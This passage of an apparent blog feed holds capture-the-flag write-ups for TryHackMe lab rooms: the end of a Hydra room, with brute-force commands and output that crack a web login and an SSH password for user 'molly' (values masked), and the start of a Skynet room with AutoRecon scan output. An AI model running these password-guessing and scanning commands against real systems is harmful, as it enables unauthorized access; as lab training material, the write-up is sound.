<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;123456789&#34;</span> - <span style="color:#ae81ff">3</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;password&#34;</span> - <span style="color:#ae81ff">4</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 3<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;iloveyou&#34;</span> - <span style="color:#ae81ff">5</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 4<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;princess&#34;</span> - <span style="color:#ae81ff">6</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 5<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;1234567&#34;</span> - <span style="color:#ae81ff">7</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 6<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;rockyou&#34;</span> - <span style="color:#ae81ff">8</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 7<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;12345678&#34;</span> - <span style="color:#ae81ff">9</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 8<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;abc123&#34;</span> - <span style="color:#ae81ff">10</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 9<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;nicole&#34;</span> - <span style="color:#ae81ff">11</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 10<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;daniel&#34;</span> - <span style="color:#ae81ff">12</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 11<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;babygirl&#34;</span> - <span style="color:#ae81ff">13</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 12<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;monkey&#34;</span> - <span style="color:#ae81ff">14</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 13<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;lovely&#34;</span> - <span style="color:#ae81ff">15</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 14<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;jessica&#34;</span> - <span style="color:#ae81ff">16</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 15<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;654321&#34;</span> - <span style="color:#ae81ff">17</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 6<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;michael&#34;</span> - <span style="color:#ae81ff">18</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 3<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;ashley&#34;</span> - <span style="color:#ae81ff">19</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 4<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;qwerty&#34;</span> - <span style="color:#ae81ff">20</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 9<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;111111&#34;</span> - <span style="color:#ae81ff">21</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 15<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;iloveu&#34;</span> - <span style="color:#ae81ff">22</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 1<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;000000&#34;</span> - <span style="color:#ae81ff">23</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;michelle&#34;</span> - <span style="color:#ae81ff">24</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;tigger&#34;</span> - <span style="color:#ae81ff">25</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 8<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;sunshine&#34;</span> - <span style="color:#ae81ff">26</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 10<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;chocolate&#34;</span> - <span style="color:#ae81ff">27</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 13<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;password1&#34;</span> - <span style="color:#ae81ff">28</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 14<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;soccer&#34;</span> - <span style="color:#ae81ff">29</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 5<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;anthony&#34;</span> - <span style="color:#ae81ff">30</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 7<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;friends&#34;</span> - <span style="color:#ae81ff">31</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 11<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;butterfly&#34;</span> - <span style="color:#ae81ff">32</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 12<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;purple&#34;</span> - <span style="color:#ae81ff">33</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 4<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;angel&#34;</span> - <span style="color:#ae81ff">34</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 9<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;jordan&#34;</span> - <span style="color:#ae81ff">35</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 3<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;liverpool&#34;</span> - <span style="color:#ae81ff">36</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 6<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;justin&#34;</span> - <span style="color:#ae81ff">37</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 1<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;loveme&#34;</span> - <span style="color:#ae81ff">38</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 15<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;fuckyou&#34;</span> - <span style="color:#ae81ff">39</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 8<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;123123&#34;</span> - <span style="color:#ae81ff">40</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 13<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;football&#34;</span> - <span style="color:#ae81ff">41</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;secret&#34;</span> - <span style="color:#ae81ff">42</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;andrea&#34;</span> - <span style="color:#ae81ff">43</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 7<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;carlos&#34;</span> - <span style="color:#ae81ff">44</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 5<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.207.42   login: molly   password: REDACTED
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2020-08-26 14:30:38

</code></pre></div><p>With that we obtained Molly&rsquo;s password, if we login into that web login form we&rsquo;ll get our first flag:</p>
<p><img src="https://i.imgur.com/Z9XtHj7.png" alt="First Flag"></p>
<p>THM{REDACTED_FIRST_FLAG}</p>
<p>Now we need to use hydra again, but this time to Bruteforce Molly&rsquo;s SSH access:</p>
<p>We see a sample attack is like follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">hydra -l root -P passwords.txt -t <span style="color:#ae81ff">32</span> &lt;IP&gt; ssh
</code></pre></div><p>So we model our second attack following that example and execute it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/hydra<span style="color:#f92672">]</span>
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt -t <span style="color:#ae81ff">32</span> 10.10.207.42 ssh                                                                               <span style="color:#ae81ff">1</span> ⨯
Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-26 14:39:25
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">32</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">32</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~448263 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.10.207.42:22/
<span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.207.42   login: molly   password: REDACTED
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">13</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">13</span> targets did not resolve or could not be connected
<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> target did not complete
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2020-08-26 14:39:35

</code></pre></div><p>We got Molly&rsquo;s SSH credentials now. Time to look for the last flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/hydra<span style="color:#f92672">]</span>
└─$ ssh molly@10.10.207.42                                                                                                                                <span style="color:#ae81ff">255</span> ⨯
The authenticity of host <span style="color:#e6db74">&#39;10.10.207.42 (10.10.207.42)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:1+x45urBtNteGs0xMVwPnfDikwOijzmb/LA9/vabra0.
</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.207.42<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
</span><span style="color:#e6db74">molly@10.10.207.42&#39;</span>s password: 
Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-1092-aws x86_64<span style="color:#f92672">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span style="color:#ae81ff">65</span> packages can be updated.
<span style="color:#ae81ff">32</span> updates are security updates.


Last login: Tue Dec <span style="color:#ae81ff">17</span> 14:37:49 <span style="color:#ae81ff">2019</span> from 10.8.11.98
molly@ip-10-10-207-42:~$ ls
flag2.txt
molly@ip-10-10-207-42:~$ cat flag2.txt
THM<span style="color:#f92672">{</span>SECOND_FLAG_REDACTED<span style="color:#f92672">}</span>
</code></pre></div><p>That&rsquo;s all there is to it.</p>
<p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
        <item>
            <title>Skynet_writeup.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/skynet_writeup/</link>
            <pubDate>Tue, 25 Aug 2020 20:59:31 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/skynet_writeup/</guid>
            <description>Skynet THM Room This is a quick writeup or another &amp;ldquo;just-me-taking-notes&amp;rdquo; thing for Skynet TryhackMe&amp;rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)
Enjoy!
 Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</description>
            <content type="html"><![CDATA[<h1 id="skynet-thm-room">Skynet THM Room</h1>
<p>This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for Skynet TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)</p>
<p>Enjoy!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/skynet">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
<li>Donwload Autorecon by clicking <a href="https://github.com/Tib3rius/AutoRecon">this</a> link.</li>
</ul>
<h2 id="task-1-deploy-and-compromise-the-vulnerable-machine">[Task 1] Deploy and compromise the vulnerable machine!</h2>
<p>Let&rsquo;s start by doing some recon, some multithreaded reacon. We&rsquo;ll try out autorecon this time.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~$ autorecon 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanning target 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-quick on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-full-tcp on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-top-20-udp on 10.10.128.90
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Service detection nmap-top-20-udp on 10.10.128.90 returned non-zero exit code: <span style="color:#ae81ff">1</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:26:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">2</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:27:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">2</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service detection nmap-quick on 10.10.128.90 finished successfully in <span style="color:#ae81ff">2</span> minutes, <span style="color:#ae81ff">27</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ssh on tcp/22 on target 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found http on tcp/80 on target 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found pop3 on tcp/110 on target 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found netbios-ssn on tcp/139 on target 10.10.128.90
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/139/nbtscan<span style="color:#f92672">]</span> Scan cannot be run against tcp port 139. Skipping.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found imap on tcp/143 on target 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found netbios-ssn on tcp/445 on target 10.10.128.90
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/445/enum4linux on 10.10.128.90<span style="color:#f92672">]</span> Scan should only be run once and it appears to have already been queued. Skipping.
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/445/nbtscan<span style="color:#f92672">]</span> Scan cannot be run against tcp port 445. Skipping.
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/445/smbclient on 10.10.128.90<span style="color:#f92672">]</span> Scan should only be run once and it appears to have already been queued. Skipping.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/22/sslscan on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/22/nmap-ssh on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/sslscan on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/nmap-http on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/curl-index on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/curl-robots on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/wkhtmltoimage on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/whatweb on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/nikto on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/22/sslscan on 10.10.128.90 finished successfully in less than a second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/sslscan on 10.10.128.90 finished successfully in less than a second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/gobuster on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/110/sslscan on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/110/sslscan on 10.10.128.90 finished successfully in less than a second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/110/nmap-pop3 on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/curl-robots on 10.10.128.90 finished successfully in <span style="color:#ae81ff">1</span> second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/sslscan on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/curl-index on 10.10.128.90 finished successfully in <span style="color:#ae81ff">1</span> second
